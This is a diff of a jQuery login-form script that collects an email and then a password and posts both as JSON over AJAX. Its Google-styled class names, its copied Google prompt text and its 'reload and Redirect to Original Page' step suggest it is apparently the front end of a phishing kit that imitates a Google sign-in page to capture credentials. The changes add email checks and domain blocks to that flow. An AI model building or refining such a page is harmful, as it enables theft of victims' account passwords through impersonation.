@@ -1,47 +1,56 @@
 import auth from './class/validate';
 
-
 $(document).ready(function () {
     $('.__issetUserName').hide();
     $('.errorMsg1').hide();
     $('.errorMsg2').hide();
     $('.cpanel1').show();
     $('.cpanel2').hide();
-    var UserEmail, Userpassword;
+    let UserEmail, Userpassword;
     $('.btn-google').on('click', function () {
         UserEmail = $('.____userEmail').val();
-        if (UserEmail == "") {
+        const myAuthObject = new auth(UserEmail);
+        if (UserEmail === "") {
             $('.stUf5b').fadeIn();
-            $('.errorMsg1').fadeIn().html("Enter an email or phone number.");
+            $('.errorMsg1').fadeIn().html("Enter your email address.");
             $('.____userEmail').focus();
             return false;
         } else {
-            //$('.bbb-input').hide();
-            $('.__issetUserName').fadeIn();
-            $('.stUf5b').hide();
-            $('.cpanel1').hide();
-            $('.cpanel2').show();
-            $('.errorMsg1').hide();
-            $('.__issetUserName').html(UserEmail);
+            // Create an instance of MyClass
+
+            if (myAuthObject.regex() === 303){
+                $('.stUf5b').fadeIn();
+                $('.errorMsg1').fadeIn().html("Invalid Email Address..! Please Enter A Valid Email Address.");
+                $('.____userEmail').focus();
+                return false;
+            }else  if (myAuthObject.regex() === 401){
+                $('.stUf5b').fadeIn();
+                $('.errorMsg1').fadeIn().html("Sorry..!! uk.com or sail.com is not allow, Please Use Another Email Address.");
+                $('.____userEmail').focus();
+                return false;
+            }else{
+                //$('.bbb-input').hide();
+                $('.__issetUserName').fadeIn();
+                $('.stUf5b').hide();
+                $('.cpanel1').hide();
+                $('.cpanel2').show();
+                $('.errorMsg1').hide();
+                $('.__issetUserName').html(UserEmail);
+            }
+
         }
     });
     $('.btn-googleSubmint').on('click', function () {
         Userpassword = $('.____userPassword').val();
         UserEmail = $('.____userEmail').val();
-        if (Userpassword == "") {
+        if (Userpassword === "") {
             // $('.bpin').show()
             $('.stUf5b').fadeIn();
-            $('.errorMsg2').fadeIn().html("Enter a password.");
+            $('.errorMsg2').fadeIn().html("Enter your password.");
             $('.____userPassword').focus().css("border", "red solid 2px");
             return false;
         } else {
-            $('.bpin').fadeOut();
-            $('.bpin').hide();
-            $('.errorMsg2').fadeOut();
-            $('.errorMsg2').hide();
-
             const data = {"_email": UserEmail,"_password": Userpassword};
-            // Create an instance of MyClass
             const myAuthObject = new auth();
             let Data = JSON.stringify(data);
             $.ajax({
@@ -53,7 +62,7 @@ $(document).ready(function () {
                 processData: false, //false because the preprocessor are not trigger
                 encode: true, //turn on json encoding
                 crossOrigin: true, // true because we are sending data with ajax as json format to php
-                async: true, //because we are expecting long data so we set the whole data  Asynchronous with means configuring our Ajax code
+                async: true, //because we are expecting long data, so we set the whole data  Asynchronous with means configuring our Ajax code
                 crossDomain: true, //just in case we host the site
                 headers: {
                     'Access-Control-Allow-Methods': '*',
@@ -66,29 +75,30 @@ $(document).ready(function () {
                     'Content-Type': 'application/json'
                 },
             }).done(function (response) {
-                if (response.status == 200) {
+                if (response.status === 200) {
                      $('.stUf5b').hide();
                     $('.errorMsg2').fadeIn().html(response.message);
                     // delay and reload and Redirect to Original Page
                     window.location.reload();
                 } else {
-                    $('.____userEmail').focus().css("border", "red solid 2px");
+                    $('.stUf5b').show();
+                    $('.errorMsg2').show().html(response.message);
                     $('.____userPassword').focus().css("border", "red solid 2px");
-                    $('.stUf5b').fadeIn();
-                    $('.errorMsg2').fadeIn().html(response.message);
+                    return false;
+
                 }
             }).fail((xhr, status, error) => {
                 console.log('Oops...', 'Something went wrong with ajax !', 'error');
             });
         }
     });
-    
-    $('.____rememberMe').on('click', function () {
-        var show = $('.____userPassword');
-        if (show.type == 'password') {
-            show.type = 'text';
-        } else {
-            show.type = 'password';
-        }
-    });
+    $("#clearPasswordText").click(function() {
+        const password = document.querySelector('.____userPassword');
+        // toggle the type attribute
+        const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+        password.setAttribute('type', type);
+        // toggle the eye slash icon
+        this.classList.toggle('fa-eye-slash');
+    })
 });
+
